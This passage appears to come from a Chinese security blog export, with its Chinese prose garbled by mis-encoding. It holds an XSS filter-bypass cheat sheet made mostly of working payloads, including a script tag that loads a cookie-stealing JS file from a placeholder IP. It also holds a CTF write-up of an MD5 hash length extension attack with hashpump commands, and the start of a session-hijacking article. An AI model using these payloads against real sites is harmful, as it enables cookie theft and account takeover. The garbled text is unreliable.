&lt;?php ini_set(&quot;error_reporting&quot;,&quot;E_ALL &amp; ~E_NOTICE&quot;); $ss=$_GET[&apos;xss&apos;]; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot;&lt;br/&gt;&quot;; echo &quot; &quot;; $ss=preg_replace(&quot;/\./&quot;,&quot;&quot;,$ss); $ss=preg_replace(&quot;/\&apos;/&quot;,&quot;&quot;,$ss); $ss=preg_replace(&quot;/\&quot;/&quot;,&quot;&quot;,$ss); echo &quot;$ss&quot;; ?&gt;ËøáÊª§‰∫ÜÂçïÂºïÂè∑ÂèåÂºïÂè∑Âíå.„ÄÇ ÊåâÂéüÊñáÂèØ‰ª•‰ΩøÁî®Êï∞ÁªÑÂΩ¢ÂºèÔºå.ÂèØ‰ª•ÈááÁî®ÂçÅËøõÂà∂Êù•Ë°®Á§∫„ÄÇÂºïÂè∑‰ΩøÁî®ÂèçÂºïÂè∑‰ª£Êõø„ÄÇ http://127.0.0.1/xss.php?xss=&lt;script&gt;window[&apos;open&apos;](&apos;http://2544985753&apos;)&lt;/script&gt;ËøáÊª§Á©∫Ê†º1.‰ΩøÁî®/Êõø‰ª£Á©∫Ê†º Â¶ÇÔºö&lt;img/src=&apos;1&apos;/onerror=alert(&quot;xss&quot;);&gt; 2.Â§ßÂ∞èÂÜôÁªïËøáÔºåÂáΩÊï∞‰∏çËÉΩÂ§ßÂ∞èÂÜô 3.Â¶ÇÊûúÊòØÊ≠£ÂàôÊõøÊç¢ÂåπÈÖçÂ∞Üscript img Á≠âÁΩÆÊç¢‰∏∫Á©∫ÔºåÂèØÈááÂèñÂèåÂÜôÁªïËøáÔºåÂ¶ÇÔºöscrscriptipt 4.evalÂ≠óÁ¨¶ÊãºÊé•„ÄÇ &lt;img src=&quot;x&quot; onerror=&quot;a=`aler`;b=`t`;c=&apos;(`xss`);&apos;;eval(a+b+c)&quot;&gt; 5.topÊãºÊé•Â≠óÁ¨¶ &lt;script&gt;top[&quot;al&quot;+&quot;ert&quot;](`xss`);&lt;/script&gt; 6. Â¶ÇÊûúscriptÊ≤°Ë¢´Á¶ÅÊ≠¢ÔºåÂèØ‰ª•ÂÜô,Âè™Êúâscript Ê†áÁ≠æÈáåÁöÑsrcÂèØ‰ª•Ëß£ÊûêjsÂÖ∂‰ªñÁöÑÊ†áÁ≠æ‰∏çÂèØ‰ª•„ÄÇ &lt;script src=&quot;http://xx.xx.xx.xx/xss/myjs/cookie.js&quot;&gt;&lt;/script&gt; ÂÆû‰ΩìÂåñÂ≠óÁ¨¶ÁªïËøáÔºåÂú®ÊµèËßàÂô®‰∏≠ÈúÄË¶ÅurlÁºñÁ†Å ÂÆû‰ΩìÂåñÂ≠óÁ¨¶ÔºåÊµèËßàÂô®‰ºöËá™Âä®Êà™Êñ≠#ÂêéÈù¢Â≠óÁ¨¶„ÄÇ &lt;img src=&quot;x&quot; onerror=&quot;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#34;&amp;#120;&amp;#115;&amp;#115;&amp;#34;&amp;#41;&amp;#59;&quot;&gt; UnicodeÁºñÁ†ÅÁªïËøá &lt;img src=&quot;x&quot; onerror=&quot;eval(&apos;\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029\u003b&apos;)&quot;&gt; urlÁºñÁ†ÅÁªïËøá &lt;img src=&quot;x&quot; onerror=&quot;eval(unescape(&apos;%61%6c%65%72%74%28%22%78%73%73%22%29%3b&apos;))&quot;&gt; #unescapeÂØπÊã¨Âè∑ÂÜÖËøõË°åËß£Á†Å dataÂçèËÆÆ //xssÂ∏∏Áî® &lt;iframe src=&quot;data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E&quot;&gt;&lt;/iframe&gt; #‰∏çurlÁºñÁ†Å‰πüÂèØ„ÄÇ &lt;iframe src=&quot;data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=&quot;&gt; #Â•ΩÁî®ÁúüÂ•ΩÁî®„ÄÇ AsciiÁ†ÅÁªïËøá &lt;img src=&quot;x&quot; onerror=&quot;eval(String.fromCharCode(97,108,101,114,116,40,34,120,115,115,34,41,59))&quot;&gt; hexÁªïËøá &lt;img src=x onerror=eval(&apos;\x61\x6c\x65\x72\x74\x28\x27\x78\x73\x73\x27\x29&apos;)&gt; ÂÖ´ËøõÂà∂ &lt;img src=x onerror=alert(&apos;\170\163\163&apos;)&gt; base64ÁªïËøá &lt;img src=&quot;x&quot; onerror=&quot;eval(atob(&apos;ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw==&apos;))&quot;&gt; javascript: ÂçèËÆÆ XSS &lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt; //ÈúÄË¶ÅÁÇπÂáª &lt;iframe src=javascript:alert(&apos;xss&apos;);&gt;&lt;/iframe&gt; //Áõ¥Êé•ÊâßË°åjs 7.Âú®js‰∏≠Âà©Áî®ÂèçÂºïÂè∑Êõø‰ª£ÂçïÂºïÂè∑ÂèåÂºïÂè∑„ÄÇÂ¶ÇÔºö &lt;img src=1 onerror=alert(`aa`)&gt; 8.ËøáÊª§Êã¨Âè∑ &lt;svg/onload=&quot;window.onerror=eval;throw&apos;=alert\x281\x29&apos;;&quot;&gt; 9.htmlÊ†áÁ≠æ‰∏≠Áî®//ÂèØ‰ª•‰ª£Êõøhttp:// 10.ÂçÅËøõÂà∂ip &lt;img src=&quot;x&quot; onerror=document.location=`http://2130706433/`&gt;ÈªëÈ≠îÊ≥ïsvg xss&lt;svg&gt;&lt;script&gt;alert&amp;#40;1)&lt;/script&gt; ÂèØ‰ª•ÊâßË°åxssÊîªÂáªÔºå‰ΩÜÊòØ&lt;script&gt;alert&amp;#40;1)&lt;/script&gt;Âç¥‰∏çÂèØ‰ª•Ôºå‰∏∫‰ªÄ‰πàÂä†&lt;svg&gt;ÂèØ‰ª•ÊâßË°åÔºåsvgÂ±û‰∫éÂ§ñÈÉ®ÂÖÉÁ¥†ÔºåÂ§ñÈÉ®ÂÖÉÁ¥†Êù•Ê∫ê‰∫éMathMLÂíåSVGÂëΩÂêçÁ©∫Èó¥„ÄÇËÄåmathmlÁöÑÂÆö‰πâÂ¶Ç‰∏ã„ÄÇ ÈÇ£‰πàÁõ∏Â∫îÁöÑÊ†áÁ≠æ‰πüÈÅµÂæ™xml ÂíåsvgdÁöÑÂÆö‰πâÔºåÂú®xml‰∏≠ &amp;#40;‰ºöË¢´Ëß£ÊûêÊàêÔºàÔºåÊâÄ‰ª•ÂèØ‰ª•ÊâßË°å„ÄÇ ÂèØ‰ª•ÁúãËÄÉ‰∏ãÂéüÊñáÔºå https://www.hackersb.cn/hacker/85.html ÈÇÆ‰ª∂Ê†ºÂºèXSSÈÄöÂ∏∏ÊÉÖÂÜµ‰∏ãÈÇÆ‰ª∂Ê†ºÂºè‰πü‰ºöÈÄ†ÊàêXSSÔºåÂøÖÈ°ªÊåâÁÖßÊúâÊïàÁöÑÁîµÂ≠êÂú∞ÂùÄÊâçËÉΩÂ°´ÂÜôÊàêÂäüÔºå &quot;&lt;svg/onload=alert(1)&gt;&quot;@x.yÊó¢Á¨¶ÂêàÊ†ºÂºè‰πüÂèØ‰ª•ÈÄ†ÊàêXSSÔºå urlÁöÑ%0AÁªïËøáÂú®ÂÆûÈôÖÊÉÖÂÜµ‰∏≠ÔºåÂú®ÈúÄË¶ÅÊàë‰ª¨ËæìÂÖ•urlÁöÑËæìÂÖ•Ê°Ü‰∏≠ÔºåÂØπËßÑÂàôËøõË°å‰∫ÜÊ£ÄÊü•ÔºåÂ¶ÇÊûúÊàë‰ª¨ÂÜôjavascript://ÊòØÊ≤°Ê≥ïÊâßË°åÁöÑÔºåÂõ†‰∏∫Âú®JavaScript‰º™ÂçèËÆÆ‰∏≠ÔºåÊàë‰ª¨Âú®ÂèåÊñúÁ∫øÂêéÈù¢‰ΩøÁî®JS‰ª£Á†ÅÔºå‰ºöpayloadÊó†ÊïàÔºå ‰πüÂ∞±ÊòØ &lt;iframe src=&quot;javascript://alert(1)&quot;&gt;Ëøô‰∏™Êó∂ÂÄôÂèØ‰ª•Áî®Êç¢Ë°åÁ¨¶ÁªïËøá„ÄÇ &lt;iframe src=&quot;javascript://%250Aalert(1)&quot;&gt; &lt;iframe src=&quot;javascript://https://domain.com/%250A1?alert(1):0&quot;&gt;ÁªïËøáÂçïÂèåÂºïÂè∑ÂàÜÂè∑https://xz.aliyun.com/t/4010ÂèÇËÄÉÔºöhttps://xz.aliyun.com/t/4414ÂèÇËÄÉÔºöhttps://www.hackersb.cn/hacker/85.htmlÂèÇËÄÉÔºöhttps://xz.aliyun.com/t/4067ÂèÇËÄÉÔºöhttps://xz.aliyun.com/t/4074#toc-1]]></content>
      <tags>
        <tag>webÊºèÊ¥û</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª]]></title>
    <url>%2F2019%2F03%2F03%2F%E5%93%88%E5%B8%8C%E9%95%BF%E5%BA%A6%E6%8B%93%E5%B1%95%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[ËÆ∞ÂΩï‰∏ÄÈÅìCTFÈ¢òÁõÆÔºåÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáªÔºåÂéüÁêÜÊúâÁÇπÂ§çÊùÇÔºåËøôÈáå‰ªÖËÆ∞ÂΩï‰∏ãÁî®Â∑•ÂÖ∑ËøõË°åÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª„ÄÇ È¢òÁõÆÂú∞ÂùÄÔºöhttp://ctf5.shiyanbar.com/web/kzhan.php È¶ñÂÖàÂÖàÂÆâË£Ö‰∏ãÂ∑•ÂÖ∑„ÄÇ ÂÆâË£ÖhashpumpÂÖàÂÆâË£ÖÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáªÁöÑÂ∑•ÂÖ∑ÔºåÂæàÂÆπÊòìÁôæÂ∫¶Âà∞Ôºå ‰ΩøÁî®hashpumpÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÂ∑•ÂÖ∑„ÄÇ crypto hashpump ÈÉ®ÁΩ≤ÂìàÂ∏åÈïøÂ∫¶Êâ©Â±ïÊîªÂáªÁöÑÂ∑•ÂÖ∑ ÂèØ‰ª•Âú®python‰∏≠ËøêË°å‰πüÂèØ‰ª•Áõ¥Êé•Âú®kali‰∏≠ÂÆâË£Ö„ÄÇ Âú®linuxÂÆâË£ÖÊ≠•È™§„ÄÇ git clone https://github.com/bwall/HashPump apt-get install g++ libssl-dev cd HashPump make make installÂÆâË£ÖÁöÑÊó∂ÂÄôÂá∫‰∫ÜÁÇπÂ∞èÈóÆÈ¢ò ËÆ∞ÂΩï‰∏Ä‰∏ã„ÄÇmakeÂëΩ‰ª§ÊòæÁ§∫ command not foundÔºåÊ≤°ÊúâÂÆâË£ÖÔºåÊàëÁî®ÁöÑÊòØwindowsÁöÑkaliÊãìÂ±ïÂëΩ‰ª§Ë°åÔºåÂ§öÂ∞ëÊúâ‰∫õ‰∏çË∂≥ÔºåÂ∞±ÊòØÊ≤°ÊúâmakeËøô‰∏™Êåá‰ª§ÔºåÊõ¥Êñ∞Ê∫ê‰πãÂêé‰πüÊ≤°Ëß£ÂÜ≥ÔºåÊúÄÂêéÁôæÂ∫¶Âà∞‰∏ÄÊù°ÂëΩ‰ª§„ÄÇ sudo apt-get install gcc automake autoconf libtool make ÔºåÊÄªÁÆóÂÆâË£Ö‰∏ämakeÂëΩ‰ª§‰∫Ü„ÄÇ‰ΩÜÊòØg++Ê≤°ÂÆâË£ÖÂ•ΩÂá∫Áé∞‰∫ÜÊñ∞ÁöÑÈóÆÈ¢ò„ÄÇ root@LAPTOP-J51H1TTH:/1/HashPump# make g++ -c -Wall main.cpp make: g++: Command not found make: *** [makefile:11: main.o] Error 127Áõ¥Êé•ÂÆâË£Ö‰∏ãgcc Ôºåapt-get update gcc python‰∏≠ÁöÑÂÆâË£Ö pip install hashpumpy CTFÈ¢òÁõÆ ÊâìÂºÄÈ¢òÁõÆÈ¶ñÂÖàÊòØËøô‰∏™ÁîªÈù¢ÔºåÁªèËøáÊâ´ÊèèÔºåÊäìÂåÖ‰ø°ÊÅØÊî∂ÈõÜÂÆåÊØïÂêéÂèëÁé∞Âú®cookieÂèÇÊï∞‰∏≠ÊúâsourceÂèÇÊï∞‰∏∫0ÔºåÊîπ‰∏∫1 Â∏∏ËßÑÂá∫Ê∫êÁ†ÅÔºå‰∫ãÂÖàÁü•ÈÅìÊòØÂìàÂ∏åÈïøÂ∫¶ÊãìÂ±ïÊîªÂáªÔºåÊ∫êÁ†Å‰πüÂæàÂÆπÊòìÁúãÊáÇ„ÄÇ Ê∫êÁ†ÅÂ¶Ç‰∏ã &lt;?php $flag = &quot;XXXXXXXXXXXXXXXXXXXXXXX&quot;; $secret = &quot;XXXXXXXXXXXXXXX&quot;; // This secret is 15 characters long for security! $username = $_POST[&quot;username&quot;]; $password = $_POST[&quot;password&quot;]; if (!empty($_COOKIE[&quot;getmein&quot;])) { if (urldecode($username) === &quot;admin&quot; &amp;&amp; urldecode($password) != &quot;admin&quot;) { if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password))) { echo &quot;Congratulations! You are a registered user.\n&quot;; die (&quot;The flag is &quot;. $flag); } else { die (&quot;Your cookies don&apos;t match up! STOP HACKING THIS SITE.&quot;); } } else { die (&quot;You are not an admin! LEAVE.&quot;); } } setcookie(&quot;sample-hash&quot;, md5($secret . urldecode(&quot;admin&quot; . &quot;admin&quot;)), time() + (60 * 60 * 24 * 7)); if (empty($_COOKIE[&quot;source&quot;])) { setcookie(&quot;source&quot;, 0, time() + (60 * 60 * 24 * 7)); } else { if ($_COOKIE[&quot;source&quot;] != 0) { echo &quot;&quot;; // This source code is outputted here } }Á¨¨‰∏ÄÊ≠•ÔºåÂú®burpÂèÇÊï∞‰∏≠Âä†getmeinÔºåÁªïËøáÁ¨¨‰∏ÄÂ±Çif„ÄÇ Á¨¨‰∫åÂ±Çusername=admin&amp;password=any Á¨¨‰∏âÂ±ÇÂ∞±Áî®Âà∞hashÈïøÂ∫¶ÊãìÂ±ïÊîªÂáª„ÄÇ ÈúÄË¶ÅÊûÑÈÄ†Ôºå if ($COOKIE[&quot;getmein&quot;] === md5($secret . urldecode($username . $password)))‰ΩÜÊòØ$secretÁöÑÂèòÈáè‰∏çÁü•ÈÅìÔºåÂè™Áü•ÈÅìÊòØÈïøÂ∫¶‰∏∫15ÁöÑ„ÄÇÂπ∂‰∏îburpÊäìÂåÖÂèØÁúãÂà∞‰∏îÊ∫êÁ†Å‰∏≠ÁªôÂá∫„ÄÇ Áü•ÈÅì md5($secret . urldecode(‚Äúadmin‚Äù . ‚Äúadmin‚Äù))=571580b26c65f306376d4f64e53cb5c7 hashÈïøÂ∫¶ÊãìÂ±ïÊîªÂáªÂâçÊèêË¶ÅÊ±Ç„ÄÇ Â¶ÇÊûúËøô‰πà‰∏Ä‰∏™ÊÉÖÂÜµÔºåÁî±‰∏§‰∏™Â≠óÁ¨¶‰∏≤ÁªÑÊàê‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤($str=$a+$b)ÔºåÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤($a)Êàë‰∏çÁü•ÈÅì‰πü‰∏çÂèØÊéßÔºåÂè™ÂèØÊéßÁ¨¨‰∫å‰∏™Â≠óÁ¨¶‰∏≤($b)ÔºåÂêåÊó∂Áü•ÈÅìÁ¨¨‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤($a)ÁöÑMD5ÂÄºÂíåÈïøÂ∫¶ÔºåËøôÊó∂ÂÄôÊàëÂ∞ÜÁ¨¨‰∫å‰∏™Â≠óÁ¨¶‰∏≤Á≤æÂøÉÊûÑÈÄ†‰∏Ä‰∏ãÔºå‰æøÂèØ‰ª•ÁÆóÂá∫ÂêàÊàêÁöÑÂ≠óÁ¨¶‰∏≤$strÁöÑMD5ÁöÑÂÄº„ÄÇ ÁÆÄÂåñ‰∏Ä‰∏ãË¶ÅÁü•ÈÅìa+bÁöÑMD5ÂÄºÔºåÈ¶ñÂÖàË¶ÅÁü•ÈÅìaÁöÑÈïøÂ∫¶ÂíåMD5ÂÄºÔºåÂæàÁÆÄÂçïÁöÑÊù°‰ª∂Ôºå Âú®Ëøô‰∏™È¢òÁõÆ‰∏≠Ôºåsecret+adminÔºåÈïøÂ∫¶‰∏∫20Ôºåmd5ÂÄºÂàôÊòØ$secret+adminadminÔºàmd5($secret . urldecode(‚Äúadmin‚Äù . ‚Äúadmin‚Äù))=571580b26c65f306376d4f64e53cb5c7ÔºâÔºåËøôÈáåÁöÑÁ≠âÊïàÁ≠æÂêç‰∏∫ secret+admin„ÄÇÊâÄ‰ª•ÈúÄË¶ÅÂä†‰∏äadminÊâÄ‰ª•ÊâçÊòØÁªôÂá∫ÁöÑMD5„ÄÇ root@LAPTOP-J51H1TTH:/1/HashPump# hashpump Input Signature: 571580b26c65f306376d4f64e53cb5c7 Input Data: admin Input Key Length: 20 Input Data to Add: a bedb98a49c228ff5e1211065cd4ae17f admin\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc8\x00\x00\x00\x00\x00\x00\x00aInput Data to Add: Èöè‰æøÂÜô„ÄÇ È¢òÁõÆ‰∏≠ÈúÄË¶ÅurldecodeÔºåÊâÄ‰ª•Â∞Ü\xÂèò‰∏∫% ÂæóÂà∞flag„ÄÇ]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sessionÔºåcookieËÆ§ËØÅ‰ºöËØùÂÆâÂÖ®ÈóÆÈ¢ò]]></title>
    <url>%2F2019%2F02%2F28%2F%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E5%8A%AB%E6%8C%81%2F</url>
    <content type="text"><![CDATA[ËΩ¨ÔºöÂÖàÁü•Á§æÂå∫ ÂâçË®ÄÂú®‰∫íËÅîÁΩë‰∏≠ÔºåÂØπ‰∫éÁî®Êà∑Êù•ËØ¥‰∏ç‰ªÖ‰ªÖÊòØÂçïÂêë‰ø°ÊÅØ‰º†ËæìÔºåÊõ¥ÈáçË¶ÅÁöÑÊòØ‰ø°ÊÅØ‰∫§‰∫íÔºå‰ΩÜÊòØÂú®web‰∏≠ÔºåhttpÂçèËÆÆÊòØÊó†Áä∂ÊÄÅÁöÑÔºåÂΩì‰∏Ä‰∏™ËØ∑Ê±ÇÁ≠âÂà∞‰∫ÜÊúçÂä°Âô®ÁöÑÂõûÂ∫î‰πãÂêéÔºå‰∏§ËÄÖËøûÊé•‰æø‰∏≠Êñ≠‰∫ÜÔºåËÄåÁ¨¨‰∫å‰∏™ËØ∑Ê±ÇÂèëÂá∫ÂêéÔºåÊúçÂä°Á´ØÂπ∂‰∏çÁü•ÈÅì‰Ω†ÂíåÁ¨¨‰∏Ä‰∏™ËØ∑Ê±ÇÁöÑÂÖ≥Á≥ªÔºåÊâÄ‰ª•Ê≤°ÂäûÊ≥ïÊåÅÁª≠‰øùÊåÅË∫´‰ªΩ‰ø°ÊÅØÔºåÊØè‰∏™httpËØ∑Ê±ÇÂØπ‰∫éÊúçÂä°Âô®Êù•ËØ¥ÔºåÂ¶ÇÊûúÊ≤°ÊúâË∫´‰ªΩËÆ§ËØÅÔºåÈÇ£‰πàÂØπÊúçÂä°Âô®Êù•ËØ¥ÊâÄÊúâ‰∫∫ÁöÑËØ∑Ê±ÇÈÉΩÊòØ‰∏ÄÊ†∑Êó†Âå∫Âà´ÁöÑ„ÄÇÊâÄ‰ª•Âú®‰∫íËÅîÁΩë‰∏≠ÔºåÂú®ÊâÄÊúâÈúÄË¶Å‰ø°ÊÅØÂèåÂêë‰∫§‰∫íÁöÑÂú∞ÊñπÂ∞±ÈúÄË¶ÅË∫´‰ªΩËÆ§ËØÅÔºåÂØπ‰∫é‰∏çÂêåÁöÑË∫´‰ªΩÁªô‰∫à‰∏çÂêåÁöÑÊùÉÈôêÔºåÊ≠§Êó∂Â∞±Áî®Âà∞‰ºöËØùËøô‰∏™Ê¶ÇÂøµ„ÄÇ ‰∏∫‰ªÄ‰πàÈúÄË¶Å‰ºöËØùÈ¶ñÂÖàË¶ÅÁêÜËß£tcpÁöÑ‰∏âÊ¨°Êè°ÊâãÔºå‰∏ÄËà¨Âú®TCP‰∏âÊ¨°Êè°ÊâãÂ∞±ÂàõÂª∫‰∫Ü‰∏Ä‰∏™‰ºöËØùÔºåÂú®‰ºöËØù‰∏≠ÂèØ‰ª•‰º†ÈÄí‰ø°ÊÅØÔºåÁ≠âTCPÂÖ≥Èó≠ËøûÊé•Â∞±ÂÖ≥Èó≠‰ºöËØù‰∫Ü„ÄÇHTTPÂçèËÆÆÊòØÂü∫‰∫éTCPÂçèËÆÆÁöÑÔºåÊâÄ‰ª•http‰ºöËØù‰πüÊòØÂú®TCPÂÖ≥Èó≠ËøûÊé•ÂêéÂ∞±ÂÖ≥Èó≠‰ºöËØùÔºåËÄåÂú®http1.1‰∏≠Ôºå‰∏ÄËà¨‰∏Ä‰∏™ËøûÊé•Â∞±Âè™ËÉΩÂ§ÑÁêÜ‰∏Ä‰∏™ËØ∑Ê±ÇÔºåÊâÄ‰ª•Âú®ÈúÄË¶ÅÊùÉÈôêË∫´‰ªΩËÆ§ËØÅÁöÑÊó∂ÂÄôÂ∞±ÈúÄË¶ÅÊúâ‰∏ÄÁßçÂá≠ËØÅÔºåÊâçËÉΩ‰ΩøÂæóÊØèÊ¨°ËØ∑Ê±ÇÊúçÂä°Âô®ÈÉΩÁü•ÈÅìÊòØ‰Ω†ÔºåÁõ∏ÂΩì‰∫éÂª∫Á´ã‰∫ÜËøûÁª≠ÁöÑ‰ºöËØùÔºå‰πüÂ∞±ÊòØÊØèÊ¨°ÁöÑËØ∑Ê±ÇÈÉΩÂ∏¶ÊúâËá™Â∑±ÁöÑË∫´‰ªΩÂá≠ËØÅ„ÄÇ ÁÆÄÂçïÁÇπÔºå‰ºöËØùÂ∞±ÊòØËÆ©‰Ω†Âú®‰ø°ÊÅØ‰∫§‰∫íÁöÑÊó∂ÂÄôËÆ©ÂØπÊñπÁü•ÈÅì‰Ω†ÊòØË∞ÅÔºåÂπ∂‰∏î‰∏ÄÁõ¥Áü•ÈÅì‰Ω†ÊòØË∞ÅÔºå‰ΩÜÊòØÊúçÂä°Âô®‰∏çÊòØ‰∫∫ÔºåÊ≤°ÊúâËá™ÊàëËæ®Âà´ÁöÑÂäüËÉΩÔºåËøôÊó∂ÂÄôÈúÄË¶Å‰∏ÄÁßçÂá≠ËØÅÔºå‰πüÂ∞±ÊòØsession„ÄÇÁ´ôÂú®ÂÆ¢Êà∑Á´ØËßíÂ∫¶ÔºåÂú®‰Ω†ÊØèÊ¨°ÁôªÂΩïÂ∏êÂè∑ÂØÜÁ†Å‰πãÂêéÔºå‰ºöÊúâ‰∏Ä‰∏≤Á±ª‰ºº‰∫éÁü≠ÁßòÈí•‰πãÁ±ªÁöÑ‰∏úË•øÔºå‰ªñÂè™Â±û‰∫é‰Ω†ÔºåËØÅÊòé‰Ω†ÁöÑË∫´‰ªΩ„ÄÇÁ´ôÂú®ÊúçÂä°Âô®Á´ØÔºåÂú®php‰∏≠ÔºåÂú®‰Ω†ËøõË°åË∫´‰ªΩËÆ§ËØÅ‰πãÂêéÔºå‰ºöÂú®ÊúçÂä°Âô®Á´Ø‰øùÂ≠ò‰∏Ä‰∏™‰ª•PHPSESSID‰∏∫ÂêçÁöÑÊñá‰ª∂Êù•ÂÇ®Â≠ò‰Ω†ÁöÑË∫´‰ªΩÔºåË¥¶Âè∑Á≠âÂêÑÁßç‰ø°ÊÅØÔºåÂú®Áî®Êà∑ÊØèÊ¨°Êèê‰∫§Â∏¶ÊúâsessionÁöÑËØ∑Ê±ÇÊó∂ÔºåËá™Âä®ÂéªÊêúÁ¥¢Ëøô‰∏™‰ª•sessionÂëΩÂêçÁöÑÊñá‰ª∂ÔºåÊü•ÁúãÈáåÈù¢ÁöÑÂèçÂ∫èÂàóÂåñ‰ø°ÊÅØÔºà‰πüÂ∞±ÊòØ‰Ω†ÁöÑË∫´‰ªΩÁ≠â‰ø°ÊÅØÔºâ„ÄÇ php‰∏≠ÁöÑsessionÂú®‰∏äÈù¢Êàë‰ª¨ÊèêÂà∞‰∫Üphp‰∏≠ÁöÑsessionÔºåÈÇ£‰πà‰∏ÄÊó¶phpsessidÊ≥ÑÈú≤ÔºåÁõ∏ÂΩì‰∫éÂà´‰∫∫‰πüÂèØ‰ª•‰ΩøÁî®‰Ω†ÁöÑË∫´‰ªΩÔºåËÄå‰∏î‰∏ÄËà¨sessionÂú®ÊµèËßàÂô®ÂÖ≥Èó≠Âêé‰πü‰∏ç‰ºöÊ≥®ÈîÄÔºå‰ªÖ‰ªÖÊòØ‰Ω†Â∑≤Áªè‰∏¢Â§±‰∫Ü‰Ω†ÁöÑsessionidÔºå‰ΩÜÊòØÊúçÂä°Á´ØÂπ∂Êú™Á´ãÂàªÂ§±Êïà„ÄÇ‰ΩÜÊòØÂú®php‰∏≠Âπ∂‰∏çÊòØÂú®ÁôªÂΩï‰πãÂêéÊâç‰ºöÁªôPHPSESSIDÔºåËÄåÊòØÂú® session_start();ÂºÄÂßã‰πãÂêéÔºåhttpÂìçÂ∫îÂ§¥ÈÉ®‰ø°ÊÅØ‰ºöËøîÂõû set-cookie:PHPSESSID=xxxxxxx,ÊµèËßàÂô®‰æø‰ºöËá™Âä®ÂàõÂª∫Ëøô‰∏™cookieÔºåÂπ∂‰∏îÂÖ≥ËÅîËøô‰∏™ÂüüÂêç„ÄÇÂêåÊó∂Ôºå‰πüÂú®ÊúçÂä°Âô®Á´ØÂàõÂª∫‰∏Ä‰∏™‰ª•Session IDÂëΩÂêçÁöÑÊñá‰ª∂ÔºåÊ≠§Êó∂‰Ω†Âπ∂Ê≤°ÊúâÁôªÂΩïÔºå‰ΩÜÊòØÂ∑≤ÁªèÁªô‰∫Ü‰Ω†Áõ∏Â∫îÁöÑsessionÔºåËøôÊó∂ÂÄôÂ∏¶ÁùÄË¥¶Âè∑ÂØÜÁ†ÅÂéªÁôªÂΩïÔºåÁôªÂΩïÊàêÂäüÂêéÔºåSession IDÊâçËÉΩÂåπÈÖç‰Ω†ÁöÑ‰ø°ÊÅØÔºåÂê¶Âàô‰∏çÁôªÂΩïÔºåÂú®ÊúçÂä°Á´ØÂàõÂª∫ÁöÑsessionÊñá‰ª∂ÂÜÖÂÆπ‰∏∫Á©∫ÔºåÁôªÂΩïÊàêÂäüÂêéÔºåÂú®ÊúçÂä°Á´Ø‰ª•‰Ω†ÁöÑphpsessidÂàõÂª∫ÂÖ≥‰∫é‰Ω†‰ø°ÊÅØÁöÑÊñá‰ª∂ÔºåÂΩì‰Ω†Â∏¶ÁùÄËøô‰∏™phpsessidÁªßÁª≠ËÆøÈóÆÁöÑÊó∂ÂÄôÔºåÂ∞±‰ºö‰ªéÊúçÂä°Á´ØÊñá‰ª∂ÈáåÊü•ÊâæÂÖ≥‰∫é‰Ω†ÁöÑ‰ø°ÊÅØÔºåÊòØÂê¶ÊòØÁÆ°ÁêÜÂëòÔºåËøòÊòØÊôÆÈÄöÁî®Êà∑ÔºåËøôÂ±û‰∫éÂêéÁ´Ø‰ª£Á†ÅÁºñÂÜô‰∏ç‰ΩúËÆ®ËÆ∫„ÄÇ ËÄåÂú®ÊúçÂä°Âô®Á´ØÔºå‰ºöÊúâ‰∏Ä‰∏™sess_‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶‚Ä¶ ÂëΩÂêçÁöÑÊñá‰ª∂‰øùÂ≠òÁî®Êà∑‰ø°ÊÅØ„ÄÇËøôÈáåÂêéÂè∞‰ª£Á†Å‰ªÖ‰ªÖÁÆÄÂçïÂÜô‰∫Ü‰∏Ä‰∏™Áî®Êà∑ÊùÉÈôêÂäüËÉΩÔºåÂÆûÈôÖ‰∏ä‰ºöËÆ∞ÂΩïÊõ¥ÂÖ®Èù¢ÁöÑÁî®Êà∑‰ø°ÊÅØÔºåËÄåÈáåÈù¢ÁöÑ‰ø°ÊÅØÂÖ®ÈÉ®Ë¢´Â∫èÂàóÂåñÂ≠òÂÇ®„ÄÇ sessionÂä´ÊåÅË¶ÅÊòéÁôΩsessionÂä´ÊåÅÔºåÈ¶ñÂÖàÈúÄË¶ÅÊ∏ÖÊ•ösession idÁöÑÂ≠òÂÇ®‰ΩçÁΩÆÔºåsessionid‰∏ç‰ªÖ‰ªÖÂ≠òÂÇ®Âú®cookie‰∏≠Ôºå‰πüÂèØËÉΩÂ≠òÂÇ®Âú®post 